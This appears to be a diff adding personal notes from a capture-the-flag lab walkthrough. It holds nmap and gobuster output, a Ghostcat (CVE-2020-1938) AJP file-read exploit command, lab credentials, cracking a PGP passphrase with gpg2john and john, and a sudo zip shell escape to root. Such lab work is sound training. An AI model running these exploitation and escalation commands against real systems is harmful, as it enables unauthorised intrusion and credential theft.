@@ -1,0 +1,112 @@
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 11:21 CEST
+Nmap scan report for 10.10.249.195
+Host is up (0.035s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 f3c89f0b6ac5fe95540be9e3ba93db7c (RSA)
+|   256 dd1a09f59963a3430d2d90d8e3e11fb9 (ECDSA)
+|_  256 48d1301b386cc653ea3081805d0cf105 (ED25519)
+53/tcp   open  tcpwrapped
+8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
+| ajp-methods: 
+|_  Supported methods: GET HEAD POST OPTIONS
+8080/tcp open  http       Apache Tomcat 9.0.30
+|_http-title: Apache Tomcat/9.0.30
+|_http-favicon: Apache Tomcat
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=4/27%OT=22%CT=1%CU=30553%PV=Y%DS=2%DC=T%G=Y%TM=644A3EC
+OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=101%TI=Z%CI=I%II=I%TS=8)OPS(
+OS:O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11
+OS:NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
+OS:R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+OS:S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT      ADDRESS
+1   34.10 ms 10.9.0.1
+2   34.20 ms 10.10.249.195
+
+
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.249.195:8080
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/04/27 11:26:35 Starting gobuster in directory enumeration mode
+===============================================================
+/docs                 (Status: 302) [Size: 0] [--> /docs/]
+/examples             (Status: 302) [Size: 0] [--> /examples/]
+/manager              (Status: 302) [Size: 0] [--> /manager/]
+/http%3A%2F%2Fwww     (Status: 400) [Size: 804]
+/http%3A%2F%2Fyoutube (Status: 400) [Size: 804]
+/http%3A%2F%2Fblogs   (Status: 400) [Size: 804]
+/http%3A%2F%2Fblog    (Status: 400) [Size: 804]
+/**http%3A%2F%2Fwww   (Status: 400) [Size: 804]
+/External%5CX-News    (Status: 400) [Size: 795]
+/http%3A%2F%2Fcommunity (Status: 400) [Size: 804]
+/http%3A%2F%2Fradar   (Status: 400) [Size: 804]
+/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 804]
+/http%3A%2F%2Fweblog  (Status: 400) [Size: 804]
+/http%3A%2F%2Fswik    (Status: 400) [Size: 804]
+
+===============================================================
+2023/04/27 11:40:04 Finished
+===============================================================
+
+
+trying out the following exploit: https://www.ionize.com.au/post/exploiting-apache-tomcat-port-8009-using-apache-jserv-protocol
+
+the first one didn't work because there were no default credentials set for the manager interface
+
+found an exploit called ghostcat with CVE-2020-1938
+
+downloaded an exploit for that here: https://github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py
+
+found credentials with the following command: python3 exploit.py http://10.10.249.195:8080/ 8009 /WEB-INF/web.xml read
+
+credentials: skyfuck:8730281lkjlkjdqlksalks
+
+discovered the user.txt file in /home/merlin
+
+discovered a file called credential.pgp and another file containing a pgp private key
+
+using the following commands to decrypt the pgp file:	gpg --import tryhackme.asc
+							gpg --decrypt credential.pgp
+
+the private key seems to have a passphrase attached to it that needs to be bruteforced
+
+using the following tool to bruteforce the passphrase: https://github.com/mathewmarcus/bruteforce-gpg
+
+the tool didn't correctly install so i am using gpg2john instead: gpg2john tryhackme.asc > gpg_hash.txt
+
+brute forcing the passphrase with rockyou as follows: john --wordlist=/usr/share/wordlists/rockyou.txt gpg_hash.txt
+
+got the following credentials: tryhackme:alexandru
+
+after decrypting the credendtial.pgp got another credential: merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
+
+switched users to merlin and ran the command sudo -l to discover:	User merlin may run the following commands on ubuntu:
+									(root : root) NOPASSWD: /usr/bin/zip
+
+found the following priv esc vector on gtfobins:	TF=$(mktemp -u)
+							sudo zip $TF /etc/hosts -T -TT 'sh #'
+							sudo rm $TF
+
+successfully gained a root shell and navigated into /root for the last flag
